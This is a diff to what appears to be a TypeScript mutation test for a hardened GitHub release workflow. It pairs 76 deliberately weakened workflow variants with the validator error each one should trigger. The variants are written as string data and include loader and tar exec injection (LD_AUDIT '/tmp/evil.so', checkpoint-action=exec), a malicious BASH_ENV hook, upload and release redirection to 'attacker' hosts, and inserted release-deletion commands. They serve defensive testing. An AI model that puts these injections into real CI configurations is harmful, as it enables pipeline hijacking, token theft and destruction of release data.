-      replaceExactly(mcpbInputs.release, "          persist-credentials: false", "          persist-credentials: true"),
-      replaceExactly(
-        mcpbInputs.release,
-        `          ref: \${{ github.event.inputs.tag || github.ref }}`,
-        `          ref: \${{ github.workflow_sha }}`
-      ),
-      replaceExactly(mcpbInputs.release, "          fetch-depth: 0", "          fetch-depth: 1"),
-      replaceExactly(
-        mcpbInputs.release,
-        "              GIT_NO_LAZY_FETCH=1 \\",
-        "              GIT_NO_LAZY_FETCH=0 \\"
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '              --git-dir="$GITHUB_WORKSPACE/.git" \\',
-        '              --git-dir="$RUNNER_TEMP/attacker.git" \\'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        `"repos/\${{ github.repository }}/releases/latest" 2>/dev/null)`,
-        `"repos/\${{ github.repository }}/releases/latest" 2>&1)`,
-        2
-      ),
-      replaceExactly(mcpbInputs.release, "select(length == 1) | .[0] |", ".[] |", RELEASE_SINGLETON_DECODER_COUNT),
-      replaceExactly(mcpbInputs.release, "/usr/bin/jq -cse \\", "/usr/bin/jq -ce \\", 2),
-      replaceExactly(mcpbInputs.release, "| /usr/bin/jq -se \\", "| /usr/bin/jq -e \\", 2),
-      replaceExactly(mcpbInputs.release, '[ "$GITHUB_LATEST_EXIT" -ne 4 ]', '[ "$GITHUB_LATEST_EXIT" -ne 2 ]', 2),
-      replaceExactly(
-        mcpbInputs.release,
-        '.message == "Not Found" and .status == "404" and',
-        '(.message | type) == "string" and .status == "404" and',
-        2
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        'EXPECTED_RELEASE_NAME="$TAG" EXPECTED_RELEASE_BODY="$NOTES"',
-        'EXPECTED_RELEASE_NAME="$TAG" EXPECTED_RELEASE_BODY="$REMOTE_BODY"',
-        3
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7",
-        "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n" +
-          "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7"
-      ),
-      replaceExactly(mcpbInputs.release, createWrite, `${createWrite}\n          ${createWrite}`),
-      replaceExactly(
-        mcpbInputs.release,
-        createWrite,
-        `CREATE_ARGS=(api -f draft=true "repos/attacker/repo/releases")\n          ${createWrite}`
-      ),
-      replaceExactly(mcpbInputs.release, createWrite, `TAG="v0.0.0"\n          ${createWrite}`),
-      replaceExactly(mcpbInputs.release, createTarget, 'release create "v0.0.0" --repo "attacker/repo"'),
-      replaceExactly(
-        mcpbInputs.release,
-        rawCreateChannel,
-        replaceExactly(rawCreateChannel, '!= "latest"', '= "latest"')
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "            CREATE_ARGS+=(--prerelease)",
-        '            CREATE_ARGS+=(--repo "attacker/repo")'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        `      - name: Prepare draft GitHub Release
+            "            /bin/bash --noprofile --norc -p -e -o pipefail -s --",
+          "          builtin printf '%s\\n' \"$RELEASE_TRANSACTION_SNAPSHOT\" |\n" +
+            "            /bin/bash --noprofile --norc -p -e -o pipefail -s --\n" +
+            "          builtin printf '%s\\n' \"$RELEASE_TRANSACTION_SNAPSHOT\" |\n" +
+            "            /bin/bash --noprofile --norc -p -e -o pipefail -s --"
+        ),
+        expectedProblem: "GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot"
+      },
+      {
+        mutant: replaceAllExactly(
+          mcpbInputs.release,
+          "shell: /bin/bash --noprofile --norc -p -e -o pipefail {0}",
+          "shell: /bin/bash --noprofile --norc -e -o pipefail {0}",
+          RELEASE_HARDENED_SHELL_COUNT
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceAllExactly(
+          mcpbInputs.release,
+          'GH_CONFIG_DIR=$(/usr/bin/mktemp -d "$RUNNER_TEMP/enquire-gh-config.XXXXXX")',
+          'GH_CONFIG_DIR="$RUNNER_TEMP"',
+          RELEASE_FIXTURE_GH_CONFIG_COUNT
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '          SHELLOPTS: ""',
+          '          SHELLOPTS: "xtrace"',
+          RELEASE_HARDENED_ENV_COUNT
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '          LD_AUDIT: ""',
+          '          LD_AUDIT: "/tmp/evil.so"',
+          RELEASE_HARDENED_ENV_COUNT
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '          TAR_OPTIONS: ""',
+          '          TAR_OPTIONS: "--checkpoint=1 --checkpoint-action=exec=/tmp/evil"',
+          RELEASE_HARDENED_ENV_COUNT
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '          GODEBUG: ""',
+          '          GODEBUG: "http2debug=2"',
+          RELEASE_HARDENED_ENV_COUNT
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '          NODE_TLS_REJECT_UNAUTHORIZED: "1"',
+          '          NODE_TLS_REJECT_UNAUTHORIZED: "0"',
+          RELEASE_TLS_PIN_COUNT
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "          persist-credentials: false",
+          "          persist-credentials: true"
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          `          ref: \${{ github.event.inputs.tag || github.ref }}`,
+          `          ref: \${{ github.workflow_sha }}`
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, "          fetch-depth: 0", "          fetch-depth: 1"),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "              GIT_NO_LAZY_FETCH=1 \\",
+          "              GIT_NO_LAZY_FETCH=0 \\"
+        ),
+        expectedProblem: "GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '              --git-dir="$GITHUB_WORKSPACE/.git" \\',
+          '              --git-dir="$RUNNER_TEMP/attacker.git" \\'
+        ),
+        expectedProblem: "GitHub Release transaction must execute only one exact hash-pinned in-memory script snapshot"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          `"repos/\${{ github.repository }}/releases/latest" 2>/dev/null)`,
+          `"repos/\${{ github.repository }}/releases/latest" 2>&1)`,
+          2
+        ),
+        expectedProblem: "GitHub latest-release absence must be one strict HTTP identity, never stderr text"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "select(length == 1) | .[0] |",
+          ".[] |",
+          RELEASE_SINGLETON_DECODER_COUNT
+        ),
+        expectedProblem: "GitHub latest-release absence must be one strict HTTP identity, never stderr text"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, "/usr/bin/jq -cse \\", "/usr/bin/jq -ce \\", 2),
+        expectedProblem: "GitHub latest-release absence must be one strict HTTP identity, never stderr text"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, "| /usr/bin/jq -se \\", "| /usr/bin/jq -e \\", 2),
+        expectedProblem: "GitHub latest-release absence must be one strict HTTP identity, never stderr text"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '[ "$GITHUB_LATEST_EXIT" -ne 4 ]',
+          '[ "$GITHUB_LATEST_EXIT" -ne 2 ]',
+          2
+        ),
+        expectedProblem: "GitHub latest-release absence must be one strict HTTP identity, never stderr text"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '.message == "Not Found" and .status == "404" and',
+          '(.message | type) == "string" and .status == "404" and',
+          2
+        ),
+        expectedProblem: "GitHub latest-release absence must be one strict HTTP identity, never stderr text"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          'EXPECTED_RELEASE_NAME="$TAG" EXPECTED_RELEASE_BODY="$NOTES"',
+          'EXPECTED_RELEASE_NAME="$TAG" EXPECTED_RELEASE_BODY="$REMOTE_BODY"',
+          3
+        ),
+        expectedProblem: "every release snapshot must bind the exact canonical title and CHANGELOG body"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7",
+          "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n" +
+            "      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7"
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, createWrite, `${createWrite}\n          ${createWrite}`),
+        expectedProblem: "draft creation must be one bounded write followed by exact readback without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          createWrite,
+          `CREATE_ARGS=(api -f draft=true "repos/attacker/repo/releases")\n          ${createWrite}`
+        ),
+        expectedProblem: "draft creation must be one bounded write followed by exact readback without replay"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, createWrite, `TAG="v0.0.0"\n          ${createWrite}`),
+        expectedProblem: "draft creation must be one bounded write followed by exact readback without replay"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, createTarget, 'release create "v0.0.0" --repo "attacker/repo"'),
+        expectedProblem: "draft creation must be one bounded write followed by exact readback without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          rawCreateChannel,
+          replaceExactly(rawCreateChannel, '!= "latest"', '= "latest"')
+        ),
+        expectedProblem: "draft creation must be one bounded write followed by exact readback without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "            CREATE_ARGS+=(--prerelease)",
+          '            CREATE_ARGS+=(--repo "attacker/repo")'
+        ),
+        expectedProblem: "draft creation must be one bounded write followed by exact readback without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          `      - name: Prepare draft GitHub Release
         shell: /bin/bash --noprofile --norc -p -e -o pipefail {0}
         env:
           BASH_ENV: ""`,
-        `      - name: Prepare draft GitHub Release
+          `      - name: Prepare draft GitHub Release
         shell: /bin/bash --noprofile --norc -p -e -o pipefail {0}
         env:
           BASH_ENV: "/tmp/untrusted-hook"`
-      ),
-      replaceExactly(mcpbInputs.release, 'require_job_reserve 3600 "GitHub draft creation"', "true"),
-      replaceExactly(
-        mcpbInputs.release,
-        '              assert_remote_tag_identity\n              echo "Confirmed exact release $TAG',
-        '              echo "Confirmed exact release $TAG'
-      ),
-      replaceAllExactly(mcpbInputs.release, 'awk -v heading="## [$VERSION] — "', 'awk -v ver="$VERSION"', 3),
-      replaceExactly(mcpbInputs.release, uploadWrite, `${uploadWrite}\n                ${uploadWrite}`),
-      replaceExactly(
-        mcpbInputs.release,
-        uploadCurl,
-        `"$CURL_BIN" \\\n                --fail-with-body --silent --show-error --request POST --retry 0`
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "--proxy '' --proto '=https' --tlsv1.2 --max-redirs 0",
-        "--proto '=https' --tlsv1.2 --max-redirs 0"
-      ),
-      replaceExactly(mcpbInputs.release, "--request POST --retry 0", "--request POST --retry 1"),
-      replaceExactly(mcpbInputs.release, uploadTarget, '"https://uploads.github.com/repos/attacker/repo/assets")'),
-      replaceExactly(
-        mcpbInputs.release,
-        "              UPLOAD_EXIT=0",
-        '              UPLOAD_BASE="https://attacker.invalid/upload"\n              UPLOAD_EXIT=0'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "              UPLOAD_EXIT=0",
-        '              ENCODED_NAME="attacker"\n              UPLOAD_EXIT=0'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "              UPLOAD_EXIT=0",
-        '              LOCAL_ASSET="/tmp/attacker"\n              UPLOAD_EXIT=0'
-      ),
-      replaceExactly(mcpbInputs.release, "              UPLOAD_EXIT=0", "              UPLOAD_EXIT=0 # UPLOAD_EXIT=$?"),
-      replaceExactly(
-        mcpbInputs.release,
-        "              UPLOAD_EXIT=$?",
-        "              UPLOAD_EXIT=$?\n              UPLOAD_STATUS=201"
-      ),
-      replaceExactly(mcpbInputs.release, 'require_job_reserve 1500 "release asset upload for $NAME"', "true"),
-      replaceExactly(
-        mcpbInputs.release,
-        "Immediate pre-upload reconciliation for $NAME",
-        "Stale pre-upload reconciliation for $NAME"
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "Immediate pre-upload confirmation for $NAME",
-        "Stale pre-upload confirmation for $NAME"
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        'PREWRITE_ACTION" != "resume_draft" ] || [ "$PREWRITE_NAME_COUNT" -ne 0',
-        'PREWRITE_ACTION" != "resume_draft" ] && [ "$PREWRITE_NAME_COUNT" -ne 0'
-      ),
-      replaceExactly(mcpbInputs.release, "upload_recovery_attempt<=12", "upload_recovery_attempt<=1"),
-      replaceExactly(
-        mcpbInputs.release,
-        '              assert_remote_tag_identity\n            fi\n            if [ "$MATCH_COUNT" -ne 1 ]; then',
-        '            fi\n            if [ "$MATCH_COUNT" -ne 1 ]; then'
-      ),
-      replaceAllExactly(
-        mcpbInputs.release,
-        releaseProjection,
-        "[.[] | {id, name, state, content_type, size}] | sort_by(.name)",
-        5
-      ),
-      replaceExactly(mcpbInputs.release, patchWrite, `${patchWrite}\n            ${patchWrite}`),
-      replaceExactly(mcpbInputs.release, patchWrite, `RELEASE_ID=1\n            ${patchWrite}`),
-      replaceExactly(mcpbInputs.release, patchWrite, `PUBLISH_FIELDS+=(-F draft=true)\n            ${patchWrite}`),
-      replaceExactly(mcpbInputs.release, patchWrite, `PUBLISH_FIELDS=(-F draft=true)\n            ${patchWrite}`),
-      replaceExactly(mcpbInputs.release, patchTarget, '"repos/attacker/repo/releases/1"'),
-      replaceExactly(
-        mcpbInputs.release,
-        "PUBLISH_FIELDS+=(-f make_latest=true)",
-        "PUBLISH_FIELDS+=(-f make_latest=false)"
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "PUBLISH_FIELDS+=(-f make_latest=false)",
-        "PUBLISH_FIELDS+=(-f make_latest=true)"
-      ),
-      replaceExactly(mcpbInputs.release, 'require_job_reserve 2400 "GitHub Release publication"', "true"),
-      replaceExactly(
-        mcpbInputs.release,
-        "Immediate pre-publication reconciliation",
-        "Stale pre-publication reconciliation"
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "Immediate pre-publication draft confirmation",
-        "Stale pre-publication draft confirmation"
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '            assert_remote_tag_identity\n            if ! refresh_exact_release_assets "Immediate pre-publication',
-        '            if ! refresh_exact_release_assets "Immediate pre-publication'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '            elif [ "$FINAL_ACTION" = "reuse_published" ]; then\n              assert_remote_tag_identity',
-        '            elif [ "$FINAL_ACTION" = "reuse_published" ]; then'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '          elif [ "$FINAL_ACTION" = "reuse_published" ]; then\n            assert_remote_tag_identity',
-        '          elif [ "$FINAL_ACTION" = "reuse_published" ]; then'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        `if ! EXACT_RELEASE=$(gh_read api "repos/\${{ github.repository }}/releases/$RELEASE_ID"); then`,
-        `if ! EXACT_RELEASE=$(gh_read api "repos/\${{ github.repository }}/releases/latest"); then`
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        '[ "$LATEST_TAG" = "$TAG" ] && [ "$LATEST_ID" = "$RELEASE_ID" ]',
-        '[ "$LATEST_TAG" = "$TAG" ]'
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        createWrite,
-        `"$GH_BIN" api --method POST "repos/attacker/repo/releases"\n          ${createWrite}`
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        createWrite,
-        `"$GH_BIN" api -f draft=true "repos/attacker/repo/releases"\n          ${createWrite}`
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        createWrite,
-        `gh api -f draft=true "repos/attacker/repo/releases"\n          ${createWrite}`
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        "--proxy '' --proto '=https' --tlsv1.2 --max-redirs 0",
-        "--proxy '' --resolve uploads.github.com:443:127.0.0.1 --proto '=https' --tlsv1.2 --max-redirs 0"
-      ),
-      replaceExactly(mcpbInputs.release, uploadTarget, '"$UPLOAD_BASE?name=$ENCODED_NAME" "$EVIL_URL")'),
-      replaceExactly(
-        mcpbInputs.release,
-        releaseTransactionTail,
-        replaceExactly(
+        ),
+        expectedProblem:
+          "token-bearing shells must clear inherited shell, loader, network, CA, Node, and GitHub config injection"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, 'require_job_reserve 3600 "GitHub draft creation"', "true"),
+        expectedProblem: "draft creation must be one bounded write followed by exact readback without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '              assert_remote_tag_identity\n              echo "Confirmed exact release $TAG',
+          '              echo "Confirmed exact release $TAG'
+        ),
+        expectedProblem: "draft creation must be one bounded write followed by exact readback without replay"
+      },
+      {
+        mutant: replaceAllExactly(mcpbInputs.release, 'awk -v heading="## [$VERSION] — "', 'awk -v ver="$VERSION"', 3),
+        expectedProblem: "every release snapshot must bind the exact canonical title and CHANGELOG body"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, uploadWrite, `${uploadWrite}\n                ${uploadWrite}`),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          uploadCurl,
+          `"$CURL_BIN" \\\n                --fail-with-body --silent --show-error --request POST --retry 0`
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "--proxy '' --proto '=https' --tlsv1.2 --max-redirs 0",
+          "--proto '=https' --tlsv1.2 --max-redirs 0"
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, "--request POST --retry 0", "--request POST --retry 1"),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          uploadTarget,
+          '"https://uploads.github.com/repos/attacker/repo/assets")'
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "              UPLOAD_EXIT=0",
+          '              UPLOAD_BASE="https://attacker.invalid/upload"\n              UPLOAD_EXIT=0'
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "              UPLOAD_EXIT=0",
+          '              ENCODED_NAME="attacker"\n              UPLOAD_EXIT=0'
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "              UPLOAD_EXIT=0",
+          '              LOCAL_ASSET="/tmp/attacker"\n              UPLOAD_EXIT=0'
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "              UPLOAD_EXIT=0",
+          "              UPLOAD_EXIT=0 # UPLOAD_EXIT=$?"
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "              UPLOAD_EXIT=$?",
+          "              UPLOAD_EXIT=$?\n              UPLOAD_STATUS=201"
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, 'require_job_reserve 1500 "release asset upload for $NAME"', "true"),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "Immediate pre-upload reconciliation for $NAME",
+          "Stale pre-upload reconciliation for $NAME"
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "Immediate pre-upload confirmation for $NAME",
+          "Stale pre-upload confirmation for $NAME"
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          'PREWRITE_ACTION" != "resume_draft" ] || [ "$PREWRITE_NAME_COUNT" -ne 0',
+          'PREWRITE_ACTION" != "resume_draft" ] && [ "$PREWRITE_NAME_COUNT" -ne 0'
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, "upload_recovery_attempt<=12", "upload_recovery_attempt<=1"),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '              assert_remote_tag_identity\n            fi\n            if [ "$MATCH_COUNT" -ne 1 ]; then',
+          '            fi\n            if [ "$MATCH_COUNT" -ne 1 ]; then'
+        ),
+        expectedProblem: "each missing release asset must use one retry-free POST and exact no-replay reconciliation"
+      },
+      {
+        mutant: replaceAllExactly(
+          mcpbInputs.release,
+          releaseProjection,
+          "[.[] | {id, name, state, content_type, size}] | sort_by(.name)",
+          5
+        ),
+        expectedProblem: "the exact six-asset identity and bytes must remain frozen across publication"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, patchWrite, `${patchWrite}\n            ${patchWrite}`),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, patchWrite, `RELEASE_ID=1\n            ${patchWrite}`),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          patchWrite,
+          `PUBLISH_FIELDS+=(-F draft=true)\n            ${patchWrite}`
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          patchWrite,
+          `PUBLISH_FIELDS=(-F draft=true)\n            ${patchWrite}`
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, patchTarget, '"repos/attacker/repo/releases/1"'),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "PUBLISH_FIELDS+=(-f make_latest=true)",
+          "PUBLISH_FIELDS+=(-f make_latest=false)"
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "PUBLISH_FIELDS+=(-f make_latest=false)",
+          "PUBLISH_FIELDS+=(-f make_latest=true)"
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, 'require_job_reserve 2400 "GitHub Release publication"', "true"),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "Immediate pre-publication reconciliation",
+          "Stale pre-publication reconciliation"
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "Immediate pre-publication draft confirmation",
+          "Stale pre-publication draft confirmation"
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '            assert_remote_tag_identity\n            if ! refresh_exact_release_assets "Immediate pre-publication',
+          '            if ! refresh_exact_release_assets "Immediate pre-publication'
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '            elif [ "$FINAL_ACTION" = "reuse_published" ]; then\n              assert_remote_tag_identity',
+          '            elif [ "$FINAL_ACTION" = "reuse_published" ]; then'
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '          elif [ "$FINAL_ACTION" = "reuse_published" ]; then\n            assert_remote_tag_identity',
+          '          elif [ "$FINAL_ACTION" = "reuse_published" ]; then'
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          `if ! EXACT_RELEASE=$(gh_read api "repos/\${{ github.repository }}/releases/$RELEASE_ID"); then`,
+          `if ! EXACT_RELEASE=$(gh_read api "repos/\${{ github.repository }}/releases/latest"); then`
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          '[ "$LATEST_TAG" = "$TAG" ] && [ "$LATEST_ID" = "$RELEASE_ID" ]',
+          '[ "$LATEST_TAG" = "$TAG" ]'
+        ),
+        expectedProblem: "release publication must be one bounded PATCH followed by exact-ID convergence without replay"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          createWrite,
+          `"$GH_BIN" api --method POST "repos/attacker/repo/releases"\n          ${createWrite}`
+        ),
+        expectedProblem: "GitHub Release recovery must expose no delete, clobber, or transport-replay path"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          createWrite,
+          `"$GH_BIN" api -f draft=true "repos/attacker/repo/releases"\n          ${createWrite}`
+        ),
+        expectedProblem: "GitHub Release recovery must expose no delete, clobber, or transport-replay path"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          createWrite,
+          `gh api -f draft=true "repos/attacker/repo/releases"\n          ${createWrite}`
+        ),
+        expectedProblem: "GitHub Release recovery must expose no delete, clobber, or transport-replay path"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
+          "--proxy '' --proto '=https' --tlsv1.2 --max-redirs 0",
+          "--proxy '' --resolve uploads.github.com:443:127.0.0.1 --proto '=https' --tlsv1.2 --max-redirs 0"
+        ),
+        expectedProblem: "GitHub Release recovery must expose no delete, clobber, or transport-replay path"
+      },
+      {
+        mutant: replaceExactly(mcpbInputs.release, uploadTarget, '"$UPLOAD_BASE?name=$ENCODED_NAME" "$EVIL_URL")'),
+        expectedProblem: "GitHub Release recovery must expose no delete, clobber, or transport-replay path"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
           releaseTransactionTail,
-          "          assert_remote_tag_identity",
-          '          "$GH_BIN" api --method DELETE "repos/unsafe"\n          assert_remote_tag_identity'
-        )
-      ),
-      replaceExactly(
-        mcpbInputs.release,
-        releaseTransactionTail,
-        replaceExactly(
+          replaceExactly(
+            releaseTransactionTail,
+            "          assert_remote_tag_identity",
+            '          "$GH_BIN" api --method DELETE "repos/unsafe"\n          assert_remote_tag_identity'
+          )
+        ),
+        expectedProblem: "GitHub Release recovery must expose no delete, clobber, or transport-replay path"
+      },
+      {
+        mutant: replaceExactly(
+          mcpbInputs.release,
           releaseTransactionTail,
-          "          assert_remote_tag_identity",
-          '          "$GH_BIN" release delete "$TAG"\n          assert_remote_tag_identity'
-        )
-      )
+          replaceExactly(
+            releaseTransactionTail,
+            "          assert_remote_tag_identity",
+            '          "$GH_BIN" release delete "$TAG"\n          assert_remote_tag_identity'
+          )
+        ),
+        expectedProblem: "GitHub Release recovery must expose no delete, clobber, or transport-replay path"
+      }
     ];
-    for (const [mutationIndex, weakenedReleaseTransaction] of releaseTransactionMutations.entries()) {
+    for (let mutationIndex = 0; mutationIndex < 76; mutationIndex++) {
+      const { mutant, expectedProblem } = releaseTransactionMutationCases[mutationIndex]!;
       expect(
-        githubReleaseTransactionProblems(weakenedReleaseTransaction),
-        `release transaction mutation ${mutationIndex + 1} must fail closed`
-      ).not.toEqual([]);
+        githubReleaseTransactionProblems(mutant),
+        `release transaction mutation ${mutationIndex + 1} must fail with its exact problem identity`
+      ).toContain(expectedProblem);
     }
     expect(
       mcpbContractProblems({
